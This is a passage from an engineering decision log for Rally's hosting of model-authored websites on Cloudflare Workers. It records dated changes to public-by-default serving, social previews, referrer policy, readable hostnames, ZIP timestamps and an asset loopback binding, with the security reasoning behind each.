the detail's cancellation fence, and every privileged navigation request must
carry identity and URL from one access response. Work-stream switches can no
longer leave an old site composited over the newly selected feed or rely on
React effect timing to preserve the artifact storage boundary.

### 2026-09-02 — Published sites get complete social previews

**What changed:** Site publication now normalizes a title, description, and
local preview image into the version manifest, generating a deterministic
1200×630 Rally card when the page did not supply usable artwork. The serving
Worker injects canonical Open Graph and Twitter/X metadata into successful
current HTML and gives the preview image URL an artifact-version query. The
site-building skill now tells the model to author a specific title,
description, and `social-preview.png` rather than relying on the fallback.

**Why:** Making the stable URL publicly readable removed the authentication
failure that blocked crawlers, but public HTML alone produces a weak or empty
unfurl when the generated page omitted metadata or a share image. The publish
boundary already has every file and a bounded input, so it is the one place
that can fill the contract once instead of making every crawler request derive
it again.

**Considered and rejected:** A dedicated public `__rally` preview route would
make an immutable-looking image URL, but it would run before an active site's
model-authored viewer guard and could disclose artwork from a protected site.
Buffering active responses would make arbitrary handler output a memory cost;
they use the runtime's streaming HTML transform instead. Always using the
generated Rally card would be simpler, but would discard the subject and visual
language the author still has in context.

**Consequences:** Newly published versions unfurl without requiring every model
to remember the protocol, while authored metadata wins in the served head.
Existing manifests stay valid because `socialPreview` is optional; an unchanged
republish detects a legacy manifest and deliberately mints the preview-bearing
version instead of taking the ordinary content-deduplication return. Protected
sites still return their guard response to anonymous crawlers and keep their
image behind the same handler. A future change must not move the image onto a
platform route unless that route can prove the same per-site access decision.

### 2026-09-02 — Sites become public by default; protection becomes active code

**What changed:** Artifact `GET` and `HEAD` requests now serve the current site
without a Rally session. Cross-site and metadata-free reads are forced
anonymous even if they carry a cookie; same-origin requests and top-level
navigations receive trusted viewer headers only after a valid Rally session is
checked. The site-building guidance now says that a protected site must be
active and reject requests without `x-rally-viewer-id` before routing or serving
assets. Anonymous unsafe methods remain session-gated, public responses opt out
of search indexing, and the rail action names what it copies: **Copy public
link**.

**Why:** The stable URL is a product output intended to open in browsers and
unfurl in crawlers. Requiring every reader to enter through Rally made copied
links return 401/403 and made social previews impossible. A static page cannot
make an authorization decision, so claiming platform privacy for every site
also prevented the author from choosing the public behavior the URL implied.

**Considered and rejected:** Making every request anonymous would discard useful
member attribution for polls and sign-ups opened inside Rally. Trusting a
cookie on arbitrary cross-site reads would let a sibling artifact exercise a
handler as the victim because all artifact hosts are same-site. Keeping static
sites session-gated while publicizing active sites would invert the natural
default and leave crawlers unable to read the most common site type.

**Consequences:** Existing static and active sites are publicly readable. A
protected site is an explicit active application boundary, not an unguessable
URL: its first operation checks the Rally-injected viewer id on every route.
Unsafe cross-origin requests remain refused, public reads never receive a
viewer identity, and all responses retain the platform CSP and security
headers. Historical-version mounts remain session-gated because an old active
version cannot run its protection guard, and a stateless active site returns
503 rather than exposing assets when its handler cannot run. The readable
hostname is not treated as secrecy; its finite vocabulary is accepted because
the content is public, while `noindex` avoids turning sharing into search
discovery.

### 2026-09-02 — Pop-outs keep artifact content below the window controls

**What changed:** The desktop artifact pop-out now uses Electron's compact
native title bar instead of extending model-authored content into a hidden inset
title area.

**Why:** Artifact pages own their complete document and have no Rally layout
contract. A page whose navigation begins at the top edge therefore rendered
under the macOS traffic lights, obscuring both the site's title and the window
controls. Reserving the space in the window is the only fix that applies to
every existing and future artifact without rewriting its content.

**Considered and rejected:** Injecting padding or CSS into the artifact would
alter model-authored layout and could be undone by the page; wrapping the page
in Rally renderer content would cross the isolation boundary that keeps remote
artifact code out of the application DOM. A native title bar already owns the
controls, shows the bounded artifact title, and keeps the content surface
unchanged.

**Consequences:** Pop-outs gain a small native title area, and artifact content
starts below it on macOS. The embedded rail preview is unchanged because it has
no native window controls.

### 2026-09-02 — The redeem bootstrap keeps its same-origin identity

**What changed:** The Rally-authored `/__rally/open` bootstrap now carries
`Referrer-Policy: same-origin`; artifact documents, errors, and every other
response keep the default `no-referrer` policy.

**Why:** A production Electron trace showed the bootstrap reaching the artifact
Worker and preserving its one-time code, then Chromium submitting the
same-origin redeem form with `Sec-Fetch-Site: same-origin` but `Origin: null`.
The fetch-metadata fence correctly rejected that opaque origin with 403, so the
rail rendered the neutral "Open this from Rally" page instead of the artifact.
The `null` was produced by the bootstrap response inheriting the artifact
page's `no-referrer` policy.

**Considered and rejected:** Relaxing the origin mismatch check would admit an
opaque initiator wherever fetch metadata happened to say same-origin; moving the
code into a query parameter would put it in Cloudflare request logs; and
changing the policy on artifact content would weaken a protection unrelated to
redemption. Replacing the native form with `fetch()` would preserve a real
Origin under `no-referrer`, but it would make the bootstrap script reproduce the
navigation and neutral-error behavior the form already supplies. The bootstrap
is Rally-owned, has one same-origin form action, and never exposes its fragment
in a Referer, so giving only that response a same-origin policy is the smaller
and cheaper-to-reverse repair.

**Consequences:** Chromium-based Rally surfaces can redeem the single-use code
and receive their viewer cookie. Only the bootstrap path can be sent as a
same-origin referrer, while the fragment proof remains client-only and the
resulting artifact page continues to send no referrer. Unit and route-level
regressions lock both the policy split and refusal of the production
`Sec-Fetch-Site: same-origin` plus `Origin: null` pair.

### 2026-09-01 — Review closes navigation, retry, and local-setup gaps

**What changed:** Artifact surfaces now fence redirects as well as ordinary
navigations, initial preview loads share one abort-aware result across concurrent
presenters, and failed pop-out loads close. Public host parsing is total, desktop
host admission accepts only the two artifact label shapes, platform D1 is part of
fresh local migration setup and the runtime binding contract, and publication
reserves a new hostname before mutating the resource row.

**Why:** Review found three failure windows hidden by individually reasonable
steps. Handing artifact contents from the global fence to the origin fence also
handed redirects over, but the origin fence only listened for navigation. An
Electron `loadURL()` promise reports `ERR_ABORTED` when the bootstrap starts its
intended redemption POST, so treating every rejection as terminal can destroy a
healthy rail while a second caller has already reported success. And reserving a
hostname after a resource swap lets a D1 outage make the retry's equal-content
path return the previous artifact version. The local binding also existed before
its separate migration chain ran, making fresh development fail only at first
use.

**Considered and rejected:** Restoring the global artifact block would break the
same-origin redemption again; ignoring all `loadURL()` failures would restore
blank DNS/TLS views; moving the resource row before reservation would preserve a
retry trap; and teaching the regional migration discovery about a shared chain
would blur the deliberate regional/platform ownership boundary.

**Consequences:** Both navigation event types stay under the artifact-origin
owner; concurrent presentations agree on initial-load success; `ERR_ABORTED` is
the one non-terminal Electron load result; fresh local setup applies the shared
schema into both region state directories; and browser-local data under a legacy
UUID origin is intentionally not migrated to its readable successor.

### 2026-09-01 — Readable origins use a content-free platform route index

**What changed:** New and existing generated sites receive a deterministic
four-word public hostname of the form
`<stub>-<region>.rallyusercontent.com`. A dedicated platform-shared D1 database
reserves `(region, hostname_stub)` permanently and resolves it to the existing
UUID-addressed `ArtifactHostDO`; legacy UUID hosts remain valid.

**Why:** UUID origins made a generated site look like infrastructure rather than
something a person could recognize or share. The established stub generator
already provides the product's readable naming vocabulary, but a workspace-local
registry cannot prevent two workspaces choosing the same public origin.

**Considered and rejected:** R2 was considered as the route index, but a
point-read D1 table is cheaper for this read-heavy workload and gives the
allocator atomic uniqueness constraints. Reusing either regional product D1
would make one region authoritative for the other; duplicating rows would allow
the two allocators to collide. The chosen shared D1 stores only the opaque stub,
region, artifact UUID, and creation time—not workspace identity, content, viewer
identity, or session state.

**Consequences:** `*.rallyusercontent.com` must exist as one proxied wildcard DNS
record before either artifact Worker is promoted. Deployments promote the
backward-compatible serving Worker before the API begins minting stub origins.
Hostname rows are permanent tombstones, while all authorization, content,
sessions, Durable Objects, and R2 bytes remain in the workspace's region.

### 2026-09-01 — Archive determinism uses the ZIP calendar, not a UTC instant

**What changed:** Directory archives pin every entry to local-calendar
`1980-01-01 00:00:00`, the earliest DOS timestamp ZIP can encode, rather than
passing the UTC instant for that date to the encoder.

**Why:** `fflate` validates and serializes ZIP timestamps through local calendar
fields. West of UTC, the UTC instant was still `1979-12-31` locally, so archive
publication threw `date not in range 1980-2099` even though the intended date
looked valid in source.

**Considered and rejected:** Moving to a later UTC instant would hide the
timezone conversion only for some offsets and make the chosen date arbitrary.

**Consequences:** Every timezone encodes the same DOS calendar fields and
therefore the same archive bytes; unchanged republish deduplication remains
stable.

### 2026-09-01 — `ASSETS` becomes an exported entrypoint, because nothing else crosses

**What changed:** The `ASSETS` binding is now `ArtifactAssetLoopback`, a
`WorkerEntrypoint` exported from both the API Worker and the serving Worker and
minted per artifact version through `ctx.exports`. A Rally-authored wrapper
inside the isolate accepts the relative string the contract promises. A
stateless active site's module is now imported by a Rally entry module rather
than run directly, so both modes build the same env.

**Why:** The facet ran with an empty env and the loader path passed a plain
object carrying a `fetch`. Both were broken: the first left `this.env.ASSETS`
undefined, and the second threw `DataCloneError` on the first request, so every
**active** site — stateless and stateful alike — failed on any path its model
did not hand-write. Only static sites worked. The loader path had no test of any
kind, which is why the second half went unseen; it has one now, and the facet
fixture serves its own page through the binding instead of a hand-written
`Response` that proved the routing and hid the binding.

The repair is not obvious and the three obvious attempts all fail, so they are
recorded rather than left for the next person: a plain `{ fetch }`, an
`RpcTarget`, and the R2 bucket itself each fail with `DataCloneError`, because
the loader serializes env values. Cloudflare's own `cloudflare-os` hit this and
documents it in the same words; the `ctx.exports` loopback is their pattern.

**What a future change has to respect:** the entrypoint stays exported from
*both* entries, because `ctx.exports` is the running Worker's own exports; its
method surface stays one `fetch`, because it executes with that Worker's full
env and the props are the only thing scoping it to one artifact; and the
in-isolate wrapper stays, because the string form is a published contract that a
stub cannot satisfy on its own. The cost accepted here is a hop per asset back
into the exporting Worker, on top of the per-request supervisor hop that
`VISIBILITY_CACHE_MS` already implies — the alternative, serving assets in
Rally's layer before model code, was rejected because it takes route precedence
away from the model and deletes the server-side data read the skill teaches.

### 2026-09-01 — Review triage: drop the quota leftover, correct three claims

**What changed:** Removed the facet host's `rallySize`, and corrected three
statements in this document that no longer matched the code.

**Why:** Review found that a 100 MB write ceiling could not be enforced from a
host that composes the model's class — artifact code writes through its own
native `ctx.storage` handle during any method, GET included, so the threshold
could be crossed by an unbounded amount before any check ran, and refusing the
*next* request would have blocked reads without restoring the bound. The
promise was dropped rather than reworded, but its read stayed behind as an
unreachable RPC method on a security boundary; it is gone now, and this
document's RPC list no longer names it.

The other two are the more instructive kind. The fetch-metadata rule shipped
classifying on `Sec-Fetch-Mode`/`Sec-Fetch-Dest` after review showed
`Sec-Fetch-Site: none` misses link clicks and redirects — but this document was
left describing the rule the code had *stopped* applying, which is worse than
either version alone, because the next reader would have trusted it. And the
off-origin navigation refusal was written as though it were a property of the
fence rather than of the desktop container: CSP has no directive over where a
document navigates itself, so in a plain browser tab the channel is open. A
future change must respect that this is deliberately two claims — no off-origin
*fetch* anywhere, no off-origin *navigation* in Rally's own surfaces — and not
collapse them back into one by adding a header that appears to cover both.

### 2026-09-01 — The publish, serving, and facet layers land

**What changed:** Directory publishing, the artifact serving Worker with its
three fences, `ArtifactHostDO` and its facet data plane, the read-only SQL
admission, and the access-revocation workspace hop.

**Why:** The document pipeline shipped and immediately exposed its boundary —
the model writes excellent HTML and the only exit made it a text resource. The
gap was never generation; it was hosting, and Cloudflare's Worker Loader is
exactly the missing piece: model-written code executed at request time in a fresh
isolate with capability-based sandboxing, no deploy pipeline and no per-artifact
Cloudflare resources.

At that release, four decisions were recorded. The first—**the artifact id is
the hostname label**—was superseded by the readable-origin entry above; the
remaining UUID-addressed supervisor identity is still why the serving Worker can
reach the right object after the platform lookup. The original reasoning was:
the serving Worker could reach the right object holding
nothing but a `Host` header; an earlier draft minted short labels from a regional
allocator and rejected "addressing by artifact id" along with the
hostname→id index it was actually arguing against — the id needs no index because
the host *was* the id, and a UUID is region-wide unique for free. **The host class
composes the model's class rather than extending it**, because a subclass would
put Rally's method names in the model's namespace and win every collision, and
`query`/`describe`/`page` are exactly what a model names its own SQL helpers.
**Read-only is enforced on the statement, not by the transaction**, because
caller SQL can commit mid-payload and leave the writes behind. **The artifacts
hop hangs off the workspace**, not the work stream, because `artifact_registry`
lives in WorkspaceDO and only the object holding a list can name its children.

What was rejected: a dedicated `publish_site` tool (a tenth family member whose
rules would be identical to the ninth's, added to carry parameters the file-layout
contract deletes); a mode parameter (it can disagree with the files); tar.gz for
archives (the engineer's default, losing to a recipient who can double-click a
zip); and an `<iframe>` for the rail preview (it would widen the renderer CSP to a
wildcard artifact host and graft remote model-authored content into the
application DOM).

**`ASSETS` is an RPC stub, and it cannot be anything else.** A dynamically
loaded worker's `env` is a plain object whose values the loader *serializes*,
and it rejects a value carrying a function with `DataCloneError` — a plain
`{ fetch }`, an `RpcTarget`, and an R2 bucket binding each fail, and the first
of those shipped and threw on the first request of every active site. What
crosses is a stub minted from `ctx.exports`, an RPC reference to a real
exported entrypoint. `ArtifactAssetLoopback` is that entrypoint; it holds the
bucket in the Worker that exports it and hands the isolate a reference that can
read one version's published files and nothing else. It is exported from
**both** entries — the API Worker mints it for a facet, the serving Worker for a
loader isolate — because `ctx.exports` is the running Worker's own exports.

**A stub's `fetch` is the runtime's Fetcher, so the string form needs a
wrapper.** The declared contract is `fetch(request: Request | string)`, and the
skill teaches `env.ASSETS.fetch("/signups.json")` for reading a published data
file server-side; a stub throws `Invalid URL: /signups.json` on that, in the
caller, before the stub is dialled. So a Rally-authored wrapper runs *inside*
the isolate — the facet host already builds the env it hands `SiteData`, and a
stateless active site gets a Rally entry module in front of its own that does
the same. Both modes therefore present one contract, which is the point: a
model writes the same asset fallback either way.

**Not yet built:** the rail's site detail exists and is tested but is not yet
*mounted* — `inspector-rail.tsx` still renders the ordinary resource card for a
site, and the flag that will gate it is wired end to end but reads nowhere. The
overlay signal the main process accepts has no renderer caller yet either, so a
dialog opened over a live preview would still be painted over. Nothing that
protects data is scoped by the flag: an artifact's authorization is structural
and holds with it off.
